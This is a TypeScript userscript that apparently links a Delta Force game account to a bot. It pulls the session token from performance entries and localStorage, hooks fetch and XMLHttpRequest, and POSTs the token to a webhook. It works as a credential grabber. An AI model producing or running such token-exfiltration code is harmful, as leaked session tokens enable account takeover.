// eslint-disable-next-line @typescript-eslint/no-explicit-any
export {};

/*
 * Delta Force HQ — Webhook userscript (no-F5, instant scan)
 *
 * Không cần F5, không inject DOM, không localStorage.
 *
 * 1. performance API → scan các API call ĐÃ THỰC HIỆN → extract token
 * 2. Fallback: scan localStorage
 * 3. Fallback: hook fetch cho các API call trong tương lai
 */

(function (): void {
  var WEBHOOK_URL = '@@WEBHOOK_URL@@';
  var CODE = '@@CLAIM_CODE@@';
  var sent = false;

  function send(openid: string, token: string): void {
    console.log(
      '%c[DF] ✅ Tìm thấy token: openid=' + openid,
      'color:#0f0; font-weight:bold',
    );
    try {
      fetch(WEBHOOK_URL + '/api/df/claim', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ code: CODE, openid, token }),
        mode: 'no-cors',
      });
      console.log(
        '%c[DF] ✅ Đã gửi về bot — chờ DM xác nhận!',
        'color:#0f0; font-weight:bold',
      );
    } catch (e: unknown) {
      console.log(
        '%c[DF] ❌ Gửi fail: ' + (e as Error).message,
        'color:#f00',
      );
      console.log(
        '%c[DF] Dùng /df-link paste: ' + JSON.stringify({ openid, token }),
        'color:#f80',
      );
    }
  }

  // ─── 1. Performance API scan ────────────────────────────────
  try {
    var entries = performance.getEntriesByType('resource') as PerformanceResourceTiming[];
    for (var i = 0; i < entries.length; i++) {
      var name = entries[i].name;
      if (name.indexOf('GetMyData') !== -1) {
        console.log('%c[DF] ✅ Found API trong history: ' + name, 'color:#0f0');
        var params = new URL(name).searchParams;
        var oid = params.get('openid');
        var tok = params.get('token');
        if (oid && tok) {
          send(oid, tok);
          sent = true;
          break;
        }
      }
    }
  } catch (e: unknown) {
    console.log('%c[DF] ⚠️ Performance scan: ' + (e as Error).message, 'color:#f80');
  }

  // ─── 2. Scan localStorage (fallback) ────────────────────────
  if (!sent) {
    try {
      var hints = ['token', 'auth', 'user', 'openid', 'df', 'delta', 'sess'];
      for (var j = 0; j < localStorage.length; j++) {
        var key = localStorage.key(j);
        if (!key) continue;
        for (var h = 0; h < hints.length; h++) {
          if (key.toLowerCase().indexOf(hints[h]) !== -1) {
            var val = localStorage.getItem(key);
            console.log(
              '%c[DF] localStorage[' + key + ']: ' + (val ? val.substring(0, 60) : ''),
              'color:#888',
            );
            try {
              var obj = JSON.parse(val!);
              if (obj && obj.openid && obj.token) {
                send(obj.openid, obj.token);
                sent = true;
                break;
              }
            } catch (_) { /* not JSON */ }
          }
        }
        if (sent) break;
      }
    } catch (e2: unknown) {
      console.log('%c[DF] ⚠️ localStorage scan: ' + (e2 as Error).message, 'color:#f80');
    }
  }

  // ─── 3. Hook fetch (nếu vẫn chưa tìm thấy) ──────────────────
  if (!sent) {
    console.log(
      '%c[DF] ⏳ Chưa tìm thấy token. Hooking fetch — hãy tương tác với trang',
      'color:#ff0; font-weight:bold',
    );
    var oldFetch = window.fetch;
    window.fetch = function (...args: Parameters<typeof fetch>): Promise<Response> {
      var url = args[0];
      if (typeof url === 'string' && url.indexOf('GetMyData') !== -1) {
        var p = new URL(url).searchParams;
        if (p.get('openid') && p.get('token')) {
          send(p.get('openid')!, p.get('token')!);
        }
      }
      return (oldFetch as any).apply(this, args);
    };

    var oldOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function (m: string, u: string | URL, ...rest: unknown[]): void {
      (this as any)._u = u;
      return oldOpen.apply(this, [m, u, ...rest] as any);
    };
    var oldSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function (body?: Document | XMLHttpRequestBodyInit | null): void {
      var u = (this as any)._u as string;
      if (u && u.indexOf('GetMyData') !== -1) {
        var p2 = new URL(u).searchParams;
        if (p2.get('openid') && p2.get('token')) {
          send(p2.get('openid')!, p2.get('token')!);
        }
      }
      return oldSend.apply(this, arguments as any);
    };

    setTimeout(function (): void {
      if (!sent) {
        console.log(
          '%c[DF] ❌ Hết giờ — vẫn không tìm thấy token. Dùng /df-link paste.',
          'color:#f00; font-weight:bold',
        );
      }
    }, 30000);
  }
})();
